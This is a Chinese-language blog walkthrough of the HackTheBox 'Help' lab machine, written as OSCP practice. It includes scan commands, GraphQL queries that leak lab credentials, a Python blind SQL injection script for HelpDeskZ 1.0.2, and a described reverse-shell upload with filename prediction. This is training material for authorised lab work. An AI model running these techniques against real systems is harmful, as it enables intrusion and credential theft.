@@ -1,0 +1,325 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>OSCP-Help | Hustler&#39;s Blog</title>
+  <meta name="author" content="Hustler">
+  
+  <meta name="description" content="Everybody needs love,but hacker dont">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="OSCP-Help"/>
+  <meta property="og:site_name" content="Hustler&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Hustler&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Hustler&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/archives" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> OSCP-Help</h1>
+		</div>
+	
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Help"><a href="#Help" class="headerlink" title="Help"></a>Help</h1><h2 id="来源：HackTheBox"><a href="#来源：HackTheBox" class="headerlink" title="来源：HackTheBox"></a>来源：HackTheBox</h2><h3 id="难度：Medium"><a href="#难度：Medium" class="headerlink" title="难度：Medium"></a>难度：Medium</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-O</span> <span class="token parameter variable">-A</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sS</span> -p- <span class="token number">10.10</span>.10.121<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>发现目标开放了80，22，3000端口，并运行着一些服务：<br><img src="/images/OSCPHelp/1.JPG"><br>常规思路对80端口进行目录扫描，发现&#x2F;support&#x2F;目录跑着一个HelpDeskZ的服务，递归扫描该目录发现readme.html文件，查看得到版本为1.0.2，searchsploit发现有两个漏洞，一个未授权文件上传，一个登陆后SQL，访问页面发现提交工单处有文件上传，此时我们已经有三个思路，逐个测试发现未授权文件上传不可行，剩下两个方法均可以，这里分别说明</p>
+<h4 id="登陆后SQL"><a href="#登陆后SQL" class="headerlink" title="登陆后SQL"></a>登陆后SQL</h4><p>既然需要登陆后SQL，首要目标就是要登录，我们要如何获取这个登陆账号呢，此时3000端口上运行的服务就显得很可疑了，访问显示如下内容：<br><img src="/images/OSCPHelp/2.JPG"><br>尝试结合nmap结果，搜索如下关键词<code>Express js query language</code>找到相关内容（wp是这样写的，能找到graphql，但我不行，注意搜索内容是尽量使用国外环境，因为题目更加面向国外），知道用的语言是graphql，访问&#x2F;graphql目录显示query参数缺失：<br><img src="/images/OSCPHelp/3.JPG"><br>尝试使用常见值如user password等作为参数内容，使用graphql语句查询（形如<code>&#123;user&#125;</code>,<code>&#123;user&#123;password&#125;&#125;</code>这样神似json的格式）：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-G</span> http://10.10.10.121:3000/graphql --data-urlencode <span class="token string">"query=&#123;user&#125;"</span> <span class="token operator">|</span> jq
+
+<span class="token comment"># 相当于请求了：http://10.10.10.121:3000/graphql?query=%7Buser%7D</span>
+<span class="token comment"># url编码了"query=&#123;user&#125;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>提示需要user的subfields：<br><img src="/images/OSCPHelp/4.JPG"><br>用形如<code>&#123;user&#123;password&#125;&#125;</code>的语句查询：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-G</span> http://help.htb:3000/graphql --data-urlencode <span class="token string">'query=&#123;user &#123;username&#125; &#125;'</span> <span class="token operator">|</span> jq
+
+<span class="token comment"># 返回了用户名，继续查密码</span>
+
+<span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-G</span> http://help.htb:3000/graphql --data-urlencode <span class="token string">'query=&#123;user &#123;username,password&#125; &#125;'</span> <span class="token operator">|</span> jq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>成功查出密码：<br><img src="/images/OSCPHelp/5.JPG"><br>得到账号密码：<code>helpme@helpme.com:godhelpmeplz</code><br>随后我们登录进去，并尝试登陆后的SQL注入漏洞，searchsploit给出的脚本不能使用，但可以根据其指引内容中的手注语句写出新的脚本，注入需要的库名表名可以在其github上找到：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># python2</span>
+
+<span class="token keyword">from</span> requests <span class="token keyword">import</span> get
+<span class="token keyword">import</span> string
+cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'lang'</span><span class="token punctuation">:</span> <span class="token string">'english'</span><span class="token punctuation">,</span>
+	<span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> <span class="token string">'se3q2q1vtvmb71acq5i16ajtf1'</span><span class="token punctuation">,</span>
+	<span class="token string">'usrhash'</span><span class="token punctuation">:</span><span class="token string">'0Nwx5jIdx+P2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ/iYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BHDu89nyBt7elyC8vIIYgpCcpqa%2BUhLVh9kcZWIcDfKPw=='</span><span class="token punctuation">&#125;</span>
+url <span class="token operator">=</span> <span class="token string">'http://10.10.10.121/support/?v='</span>
+chars <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">list</span><span class="token punctuation">(</span>string<span class="token punctuation">.</span>digits<span class="token punctuation">)</span>
+password <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+k <span class="token operator">=</span> <span class="token number">1</span>
+<span class="token keyword">while</span> k <span class="token operator">&lt;=</span> <span class="token number">40</span><span class="token punctuation">:</span>
+	<span class="token keyword">for</span> i <span class="token keyword">in</span> chars<span class="token punctuation">:</span>
+		payload <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"view_tickets&amp;action=ticket&amp;param[]=4&amp;param[]=attachment&amp;param[]=1&amp;param[]= 6 and substr((select password from staff limit 0,1),&#123;&#125;,1) = '&#123;&#125;'---"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>i<span class="token punctuation">)</span>
+		resp <span class="token operator">=</span> get<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
+		<span class="token keyword">if</span> <span class="token string">'404'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> resp<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
+			password<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+			<span class="token keyword">print</span> <span class="token string">'Password: '</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>password<span class="token punctuation">)</span>
+			k <span class="token operator">=</span> k <span class="token operator">+</span> <span class="token number">1</span>
+		<span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>根据实际情况修改请求头cookie，运行得到账号密码：<code>help:Welcome1</code><br>可通过此密码登录上ssh<br>实操过程中发现始终无法复现脚本这一步，不清楚是什么问题<br>补充：傻了 忘记可以上sqlmap了 但oscp也不可以用sqlmap</p>
+<h4 id="工单处文件上传"><a href="#工单处文件上传" class="headerlink" title="工单处文件上传"></a>工单处文件上传</h4><p>在工单处发现一个文件上传，上传测试发现不知道返回地址，但是对上传文件没有做任何校验，github上有源代码，可以审计一下：<br><img src="/images/OSCPHelp/6.png"><br>可知其上传的路径形如<code>/support/something/tickets</code>，又因为github项目中有uploads文件夹，所以猜测是路径为<code>/support/uploads/tickets/something.php</code>，随后我们上传一个php_reverse_shell并且按照代码逻辑（md5(文件名+时间戳)）搞出重命名后的名称，访问即可获得一个反弹shell</p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>非常简单，内核漏洞直接拿下，没有难度</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+
+</div>
+
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2025/04/24/OSCP-sau/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2025-04-28 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/靶场练习/">靶场练习<span>12</span></a></li> <li><a href="/categories/靶场练习/OSCP/">OSCP<span>12</span></a></li> <li><a href="/categories/靶场练习/OSCP/HackTheBox/">HackTheBox<span>4</span></a></li> <li><a href="/categories/靶场练习/OSCP/HackTheBox/Medium/">Medium<span>2</span></a></li>
+
+<div class="widget tag">
+  <h3 class="title">All Categories</h3>
+     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SRC%E6%8C%96%E6%8E%98/">SRC挖掘</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E9%A1%B9%E7%9B%AE/">个人项目</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/">竞赛</a><span class="category-list-count">23</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/">CTF</a><span class="category-list-count">23</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Crypto/">Crypto</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Misc/">Misc</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/PWN/">PWN</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Reverse/">Reverse</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Web/">Web</a><span class="category-list-count">9</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/">速查</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/%E5%8D%9A%E5%AE%A2/">博客</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/%E7%AB%9E%E8%B5%9B/">竞赛</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/%E7%AB%9E%E8%B5%9B/AWD/">AWD</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/%E7%AB%9E%E8%B5%9B/CTF/">CTF</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/%E8%93%9D%E9%98%9F/">蓝队</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">靶场练习</a><span class="category-list-count">12</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/">OSCP</a><span class="category-list-count">12</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/HackTheBox/">HackTheBox</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/HackTheBox/Easy/">Easy</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/HackTheBox/Medium/">Medium</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/Vulnhub/">Vulnhub</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/Vulnhub/Easy/">Easy</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/Vulnhub/Intermediate/">Intermediate</a><span class="category-list-count">5</span></li></ul></li></ul></li></ul></li></ul> 
+</div>
+ 
+  </li>
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/OSCP/">OSCP<span>12</span></a></li> <li><a href="/tags/靶场练习/">靶场练习<span>12</span></a></li> <li><a href="/tags/HackTheBox/">HackTheBox<span>4</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!-- -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 Hustler's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+<br>
+<p>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <span id="busuanzi_container_site_uv" style="display: inline;">本站总访问量<span id="busuanzi_value_site_uv"></span>次</span>
+</p> </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
